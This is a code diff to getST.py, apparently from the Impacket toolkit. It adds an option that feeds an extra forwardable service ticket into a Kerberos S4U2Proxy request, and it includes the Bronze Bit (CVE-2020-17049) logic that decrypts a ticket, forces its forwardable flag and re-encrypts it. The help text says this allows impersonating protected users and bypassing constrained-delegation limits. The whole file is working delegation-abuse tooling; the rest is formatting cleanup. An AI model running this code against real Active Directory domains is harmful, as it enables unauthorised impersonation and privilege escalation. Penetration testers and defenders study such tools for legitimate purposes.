@@ -69,7 +69,7 @@ from impacket.winregistry import hexdump
 class GETST:
     def __init__(self, target, password, domain, options):
         self.__password = password
-        self.__user= target
+        self.__user = target
         self.__domain = domain
         self.__lmhash = ''
         self.__nthash = ''
@@ -77,6 +77,7 @@ class GETST:
         self.__options = options
         self.__kdcHost = options.dc_ip
         self.__force_forwardable = options.force_forwardable
+        self.__additional_ticket = options.additional_ticket
         self.__saveFileName = None
         if options.hashes is not None:
             self.__lmhash, self.__nthash = options.hashes.split(':')
@@ -88,8 +89,215 @@ class GETST:
         ccache.fromTGS(ticket, sessionKey, sessionKey)
         ccache.saveFile(self.__saveFileName + '.ccache')
 
+    def doS4U2ProxyWithAdditionalTicket(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost, additional_ticket_path):
+        if not os.path.isfile(additional_ticket_path):
+            logging.error("Ticket %s doesn't exist" % additional_ticket_path)
+            exit(0)
+        else:
+            decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
+            logging.info("\tUsing additional ticket %s instead of S4U2Self" % additional_ticket_path)
+            ccache = CCache.loadFile(additional_ticket_path)
+            principal = ccache.credentials[0].header['server'].prettyPrint()
+            creds = ccache.getCredential(principal)
+            TGS = creds.toTGS(principal)
+
+            tgs = decoder.decode(TGS['KDC_REP'], asn1Spec=TGS_REP())[0]
+
+            if logging.getLogger().level == logging.DEBUG:
+                logging.debug('TGS_REP')
+                print(tgs.prettyPrint())
+
+            if self.__force_forwardable:
+                # Convert hashes to binary form, just in case we're receiving strings
+                if isinstance(nthash, str):
+                    try:
+                        nthash = unhexlify(nthash)
+                    except TypeError:
+                        pass
+                if isinstance(aesKey, str):
+                    try:
+                        aesKey = unhexlify(aesKey)
+                    except TypeError:
+                        pass
+
+                # Compute NTHash and AESKey if they're not provided in arguments
+                if self.__password != '' and self.__domain != '' and self.__user != '':
+                    if not nthash:
+                        nthash = compute_nthash(self.__password)
+                        if logging.getLogger().level == logging.DEBUG:
+                            logging.debug('NTHash')
+                            print(hexlify(nthash).decode())
+                    if not aesKey:
+                        salt = self.__domain.upper() + self.__user
+                        aesKey = _AES256CTS.string_to_key(self.__password, salt, params=None).contents
+                        if logging.getLogger().level == logging.DEBUG:
+                            logging.debug('AESKey')
+                            print(hexlify(aesKey).decode())
+
+                # Get the encrypted ticket returned in the TGS. It's encrypted with one of our keys
+                cipherText = tgs['ticket']['enc-part']['cipher']
+
+                # Check which cipher was used to encrypt the ticket. It's not always the same
+                # This determines which of our keys we should use for decryption/re-encryption
+                newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]
+                if newCipher.enctype == Enctype.RC4:
+                    key = Key(newCipher.enctype, nthash)
+                else:
+                    key = Key(newCipher.enctype, aesKey)
+
+                # Decrypt and decode the ticket
+                # Key Usage 2
+                # AS-REP Ticket and TGS-REP Ticket (includes tgs session key or
+                #  application session key), encrypted with the service key
+                #  (section 5.4.2)
+                plainText = newCipher.decrypt(key, 2, cipherText)
+                encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]
+
+                # Print the flags in the ticket before modification
+                logging.debug('\tService ticket from S4U2self flags: ' + str(encTicketPart['flags']))
+                logging.debug('\tService ticket from S4U2self is'
+                              + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value] == 1) else ' not')
+                              + ' forwardable')
+
+                # Customize flags the forwardable flag is the only one that really matters
+                logging.info('\tForcing the service ticket to be forwardable')
+                # convert to string of bits
+                flagBits = encTicketPart['flags'].asBinary()
+                # Set the forwardable flag. Awkward binary string insertion
+                flagBits = flagBits[:TicketFlags.forwardable.value] + '1' + flagBits[TicketFlags.forwardable.value + 1:]
+                # Overwrite the value with the new bits
+                encTicketPart['flags'] = encTicketPart['flags'].clone(value=flagBits)  # Update flags
+
+                logging.debug('\tService ticket flags after modification: ' + str(encTicketPart['flags']))
+                logging.debug('\tService ticket now is'
+                              + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value] == 1) else ' not')
+                              + ' forwardable')
+
+                # Re-encode and re-encrypt the ticket
+                # Again, Key Usage 2
+                encodedEncTicketPart = encoder.encode(encTicketPart)
+                cipherText = newCipher.encrypt(key, 2, encodedEncTicketPart, None)
+
+                # put it back in the TGS
+                tgs['ticket']['enc-part']['cipher'] = cipherText
+
+            ################################################################################
+            # Up until here was all the S4USelf stuff. Now let's start with S4U2Proxy
+            # So here I have a ST for me.. I now want a ST for another service
+            # Extract the ticket from the TGT
+            ticketTGT = Ticket()
+            ticketTGT.from_asn1(decodedTGT['ticket'])
+
+            # Get the service ticket
+            ticket = Ticket()
+            ticket.from_asn1(tgs['ticket'])
+
+            apReq = AP_REQ()
+            apReq['pvno'] = 5
+            apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
+
+            opts = list()
+            apReq['ap-options'] = constants.encodeFlags(opts)
+            seq_set(apReq, 'ticket', ticketTGT.to_asn1)
+
+            authenticator = Authenticator()
+            authenticator['authenticator-vno'] = 5
+            authenticator['crealm'] = str(decodedTGT['crealm'])
+
+            clientName = Principal()
+            clientName.from_asn1(decodedTGT, 'crealm', 'cname')
+
+            seq_set(authenticator, 'cname', clientName.components_to_asn1)
+
+            now = datetime.datetime.utcnow()
+            authenticator['cusec'] = now.microsecond
+            authenticator['ctime'] = KerberosTime.to_asn1(now)
+
+            encodedAuthenticator = encoder.encode(authenticator)
+
+            # Key Usage 7
+            # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
+            # TGS authenticator subkey), encrypted with the TGS session
+            # key (Section 5.5.1)
+            encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)
+
+            apReq['authenticator'] = noValue
+            apReq['authenticator']['etype'] = cipher.enctype
+            apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator
+
+            encodedApReq = encoder.encode(apReq)
+
+            tgsReq = TGS_REQ()
+
+            tgsReq['pvno'] = 5
+            tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
+            tgsReq['padata'] = noValue
+            tgsReq['padata'][0] = noValue
+            tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
+            tgsReq['padata'][0]['padata-value'] = encodedApReq
+
+            # Add resource-based constrained delegation support
+            paPacOptions = PA_PAC_OPTIONS()
+            paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,))
+
+            tgsReq['padata'][1] = noValue
+            tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value
+            tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)
+
+            reqBody = seq_set(tgsReq, 'req-body')
+
+            opts = list()
+            # This specified we're doing S4U
+            opts.append(constants.KDCOptions.cname_in_addl_tkt.value)
+            opts.append(constants.KDCOptions.canonicalize.value)
+            opts.append(constants.KDCOptions.forwardable.value)
+            opts.append(constants.KDCOptions.renewable.value)
+
+            reqBody['kdc-options'] = constants.encodeFlags(opts)
+            service2 = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
+            seq_set(reqBody, 'sname', service2.components_to_asn1)
+            reqBody['realm'] = self.__domain
+
+            myTicket = ticket.to_asn1(TicketAsn1())
+            seq_set_iter(reqBody, 'additional-tickets', (myTicket,))
+
+            now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
+
+            reqBody['till'] = KerberosTime.to_asn1(now)
+            reqBody['nonce'] = random.getrandbits(31)
+            seq_set_iter(reqBody, 'etype',
+                         (
+                             int(constants.EncryptionTypes.rc4_hmac.value),
+                             int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
+                             int(constants.EncryptionTypes.des_cbc_md5.value),
+                             int(cipher.enctype)
+                         )
+                         )
+            message = encoder.encode(tgsReq)
+
+            logging.info('\tRequesting S4U2Proxy')
+            r = sendReceive(message, self.__domain, kdcHost)
+
+            tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
+
+            cipherText = tgs['enc-part']['cipher']
+
+            # Key Usage 8
+            # TGS-REP encrypted part (includes application session
+            # key), encrypted with the TGS session key (Section 5.4.2)
+            plainText = cipher.decrypt(sessionKey, 8, cipherText)
+
+            encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]
+
+            newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])
+
+            # Creating new cipher based on received keytype
+            cipher = _enctype_table[encTGSRepPart['key']['keytype']]
+
+            return r, cipher, sessionKey, newSessionKey
+
     def doS4U(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost):
-        decodedTGT = decoder.decode(tgt, asn1Spec = AS_REP())[0]
+        decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
         # Extract the ticket from the TGT
         ticket = Ticket()
         ticket.from_asn1(decodedTGT['ticket'])
@@ -99,15 +307,15 @@ class GETST:
         apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
 
         opts = list()
-        apReq['ap-options'] =  constants.encodeFlags(opts)
-        seq_set(apReq,'ticket', ticket.to_asn1)
+        apReq['ap-options'] = constants.encodeFlags(opts)
+        seq_set(apReq, 'ticket', ticket.to_asn1)
 
         authenticator = Authenticator()
         authenticator['authenticator-vno'] = 5
         authenticator['crealm'] = str(decodedTGT['crealm'])
 
         clientName = Principal()
-        clientName.from_asn1( decodedTGT, 'crealm', 'cname')
+        clientName.from_asn1(decodedTGT, 'crealm', 'cname')
 
         seq_set(authenticator, 'cname', clientName.components_to_asn1)
 
@@ -118,7 +326,7 @@ class GETST:
         if logging.getLogger().level == logging.DEBUG:
             logging.debug('AUTHENTICATOR')
             print(authenticator.prettyPrint())
-            print ('\n')
+            print('\n')
 
         encodedAuthenticator = encoder.encode(authenticator)
 
@@ -136,7 +344,7 @@ class GETST:
 
         tgsReq = TGS_REQ()
 
-        tgsReq['pvno'] =  5
+        tgsReq['pvno'] = 5
         tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
 
         tgsReq['padata'] = noValue
@@ -149,7 +357,7 @@ class GETST:
         # identified to the KDC by the user's name and realm.
         clientName = Principal(self.__options.impersonate, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
 
-        S4UByteArray = struct.pack('<I',constants.PrincipalNameType.NT_PRINCIPAL.value)
+        S4UByteArray = struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)
         S4UByteArray += b(self.__options.impersonate) + b(self.__domain) + b'Kerberos'
 
         if logging.getLogger().level == logging.DEBUG:
@@ -187,9 +395,9 @@ class GETST:
         reqBody = seq_set(tgsReq, 'req-body')
 
         opts = list()
-        opts.append( constants.KDCOptions.forwardable.value )
-        opts.append( constants.KDCOptions.renewable.value )
-        opts.append( constants.KDCOptions.canonicalize.value )
+        opts.append(constants.KDCOptions.forwardable.value)
+        opts.append(constants.KDCOptions.renewable.value)
+        opts.append(constants.KDCOptions.canonicalize.value)
 
         reqBody['kdc-options'] = constants.encodeFlags(opts)
 
@@ -203,7 +411,7 @@ class GETST:
         reqBody['till'] = KerberosTime.to_asn1(now)
         reqBody['nonce'] = random.getrandbits(31)
         seq_set_iter(reqBody, 'etype',
-                      (int(cipher.enctype),int(constants.EncryptionTypes.rc4_hmac.value)))
+                     (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))
 
         if logging.getLogger().level == logging.DEBUG:
             logging.debug('Final TGS')
@@ -214,7 +422,7 @@ class GETST:
 
         r = sendReceive(message, self.__domain, kdcHost)
 
-        tgs = decoder.decode(r, asn1Spec = TGS_REP())[0]
+        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
 
         if logging.getLogger().level == logging.DEBUG:
             logging.debug('TGS_REP')
@@ -249,7 +457,7 @@ class GETST:
 
             # Get the encrypted ticket returned in the TGS. It's encrypted with one of our keys
             cipherText = tgs['ticket']['enc-part']['cipher']
-            
+
             # Check which cipher was used to encrypt the ticket. It's not always the same
             # This determines which of our keys we should use for decryption/re-encryption
             newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]
@@ -265,33 +473,33 @@ class GETST:
             #  (section 5.4.2)
             plainText = newCipher.decrypt(key, 2, cipherText)
             encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]
-            
+
             # Print the flags in the ticket before modification
             logging.debug('\tService ticket from S4U2self flags: ' + str(encTicketPart['flags']))
             logging.debug('\tService ticket from S4U2self is'
-                + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value]==1) else ' not')
-                + ' forwardable')       
-        
-            #Customize flags the forwardable flag is the only one that really matters
+                          + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value] == 1) else ' not')
+                          + ' forwardable')
+
+            # Customize flags the forwardable flag is the only one that really matters
             logging.info('\tForcing the service ticket to be forwardable')
-            #convert to string of bits
-            flagBits = encTicketPart['flags'].asBinary() 
-            #Set the forwardable flag. Awkward binary string insertion
-            flagBits = flagBits[:TicketFlags.forwardable.value] + '1' + flagBits[TicketFlags.forwardable.value+1:]
-            #Overwrite the value with the new bits
-            encTicketPart['flags'] = encTicketPart['flags'].clone(value=flagBits)#Update flags
-            
+            # convert to string of bits
+            flagBits = encTicketPart['flags'].asBinary()
+            # Set the forwardable flag. Awkward binary string insertion
+            flagBits = flagBits[:TicketFlags.forwardable.value] + '1' + flagBits[TicketFlags.forwardable.value + 1:]
+            # Overwrite the value with the new bits
+            encTicketPart['flags'] = encTicketPart['flags'].clone(value=flagBits)  # Update flags
+
             logging.debug('\tService ticket flags after modification: ' + str(encTicketPart['flags']))
             logging.debug('\tService ticket now is'
-                + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value]==1) else ' not')
-                + ' forwardable')
-            
+                          + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value] == 1) else ' not')
+                          + ' forwardable')
+
             # Re-encode and re-encrypt the ticket
             # Again, Key Usage 2
             encodedEncTicketPart = encoder.encode(encTicketPart)
             cipherText = newCipher.encrypt(key, 2, encodedEncTicketPart, None)
-            
-            #put it back in the TGS
+
+            # put it back in the TGS
             tgs['ticket']['enc-part']['cipher'] = cipherText
 
         ################################################################################
@@ -300,25 +508,25 @@ class GETST:
         # Extract the ticket from the TGT
         ticketTGT = Ticket()
         ticketTGT.from_asn1(decodedTGT['ticket'])
-        
-        #Get the service ticket
+
+        # Get the service ticket
         ticket = Ticket()
         ticket.from_asn1(tgs['ticket'])
-        
+
         apReq = AP_REQ()
         apReq['pvno'] = 5
         apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
 
         opts = list()
-        apReq['ap-options'] =  constants.encodeFlags(opts)
-        seq_set(apReq,'ticket', ticketTGT.to_asn1)
+        apReq['ap-options'] = constants.encodeFlags(opts)
+        seq_set(apReq, 'ticket', ticketTGT.to_asn1)
 
         authenticator = Authenticator()
         authenticator['authenticator-vno'] = 5
         authenticator['crealm'] = str(decodedTGT['crealm'])
 
         clientName = Principal()
-        clientName.from_asn1( decodedTGT, 'crealm', 'cname')
+        clientName.from_asn1(decodedTGT, 'crealm', 'cname')
 
         seq_set(authenticator, 'cname', clientName.components_to_asn1)
 
@@ -379,12 +587,12 @@ class GETST:
         reqBody['till'] = KerberosTime.to_asn1(now)
         reqBody['nonce'] = random.getrandbits(31)
         seq_set_iter(reqBody, 'etype',
-                         (
-                             int(constants.EncryptionTypes.rc4_hmac.value),
-                             int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
-                             int(constants.EncryptionTypes.des_cbc_md5.value),
-                             int(cipher.enctype)
-                         )
+                     (
+                         int(constants.EncryptionTypes.rc4_hmac.value),
+                         int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
+                         int(constants.EncryptionTypes.des_cbc_md5.value),
+                         int(cipher.enctype)
+                     )
                      )
         message = encoder.encode(tgsReq)
 
@@ -450,8 +658,12 @@ class GETST:
             # Here's the rock'n'roll
             try:
                 logging.info('Impersonating %s' % self.__options.impersonate)
-                #Editing below to pass hashes for decryption
-                tgs, copher, oldSessionKey, sessionKey = self.doS4U(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey, self.__kdcHost) 
+                # Editing below to pass hashes for decryption
+                if self.__additional_ticket is not None:
+                    tgs, copher, oldSessionKey, sessionKey = self.doS4U2ProxyWithAdditionalTicket(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey,
+                                                                                                  self.__kdcHost, self.__additional_ticket)
+                else:
+                    tgs, copher, oldSessionKey, sessionKey = self.doS4U(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey, self.__kdcHost)
             except Exception as e:
                 logging.debug("Exception", exc_info=True)
                 logging.error(str(e))
@@ -463,7 +675,8 @@ class GETST:
                 return
             self.__saveFileName = self.__options.impersonate
 
-        self.saveTicket(tgs,oldSessionKey)
+        self.saveTicket(tgs, oldSessionKey)
+
 
 if __name__ == '__main__':
     print(version.BANNER)
@@ -471,36 +684,36 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(add_help=True, description="Given a password, hash or aesKey, it will request a "
                                                                 "Service Ticket and save it as ccache")
     parser.add_argument('identity', action='store', help='[domain/]username[:password]')
-    parser.add_argument('-spn', action="store", required=True,  help='SPN (service/server) of the target service the '
-                                                                     'service ticket will' ' be generated for')
-    parser.add_argument('-impersonate', action="store",  help='target username that will be impersonated (thru S4U2Self)'
-                                                              ' for quering the ST. Keep in mind this will only work if '
-                                                              'the identity provided in this scripts is allowed for '
-                                                              'delegation to the SPN specified')
+    parser.add_argument('-spn', action="store", required=True, help='SPN (service/server) of the target service the '
+                                                                    'service ticket will' ' be generated for')
+    parser.add_argument('-impersonate', action="store", help='target username that will be impersonated (thru S4U2Self)'
+                                                             ' for quering the ST. Keep in mind this will only work if '
+                                                             'the identity provided in this scripts is allowed for '
+                                                             'delegation to the SPN specified')
+    parser.add_argument('-additional-ticket', action='store', metavar='ticket.ccache', help='include a forwardable service ticket in a S4U2Proxy request for RBCD + KCD Kerberos only')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
     parser.add_argument('-force-forwardable', action='store_true', help='Force the service ticket obtained through '
-                        'S4U2Self to be forwardable. For best results, the -hashes and -aesKey values for the '
-                        'specified -identity should be provided. This allows impresonation of protected users '
-                        'and bypass of "Kerberos-only" constrained delegation restrictions. See CVE-2020-17049')
+                                                                        'S4U2Self to be forwardable. For best results, the -hashes and -aesKey values for the '
+                                                                        'specified -identity should be provided. This allows impresonation of protected users '
+                                                                        'and bypass of "Kerberos-only" constrained delegation restrictions. See CVE-2020-17049')
 
     group = parser.add_argument_group('authentication')
 
-    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
+    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
     group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
     group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
-                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
-                       'ones specified in the command line')
-    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
-                                                                            '(128 or 256 bits)')
-    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
-                       'ommited it use the domain part (FQDN) specified in the target parameter')
-    
+                                                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
+                                                       'ones specified in the command line')
+    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
+                                                                          '(128 or 256 bits)')
+    group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller. If '
+                                                                            'ommited it use the domain part (FQDN) specified in the target parameter')
 
-    if len(sys.argv)==1:
+    if len(sys.argv) == 1:
         parser.print_help()
         print("\nExamples: ")
-        print("\tgetST.py -hashes lm:nt -spn cifs/contoso-dc contoso.com/user\n")
+        print("\t./getTGT.py -hashes lm:nt contoso.com/user\n")
         print("\tit will use the lm:nt hashes for authentication. If you don't specify them, a password will be asked")
         sys.exit(1)
 
@@ -525,6 +738,7 @@ if __name__ == '__main__':
 
         if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
             from getpass import getpass
+
             password = getpass("Password:")
 
         if options.aesKey is not None:
@@ -535,5 +749,6 @@ if __name__ == '__main__':
     except Exception as e:
         if logging.getLogger().level == logging.DEBUG:
             import traceback
+
             traceback.print_exc()
         print(str(e))
